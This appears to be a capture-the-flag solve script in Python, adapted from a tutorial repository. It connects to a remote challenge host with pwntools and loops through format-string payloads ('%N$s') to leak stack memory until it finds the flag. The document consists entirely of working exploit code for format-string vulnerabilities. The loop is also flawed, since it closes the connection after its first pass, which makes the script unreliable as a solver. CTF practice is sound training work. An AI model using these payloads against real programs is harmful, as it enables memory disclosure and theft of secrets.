# solve script modified from CryptoCat
# source: https://github.com/Crypto-Cat/CTF/blob/main/pwn/binary_exploitation_101/07-format_string_vulns/fuzz.py

from pwn import *

p = remote('crossover.proxy.rlwy.net',56778)

for i in range(100):
    # When we see the user prompt, format the counter
    # e.g. %2$s will attempt to print second pointer as string
    p.sendline('%{}$s'.format(i).encode())
    p.recvuntil(b': ')
    result = p.recvuntil(b'\n')
    p.close()
    if b'sstctf{' in result:
        print(str(i) + ': ' + (result.decode().rstrip('\n')))
        break
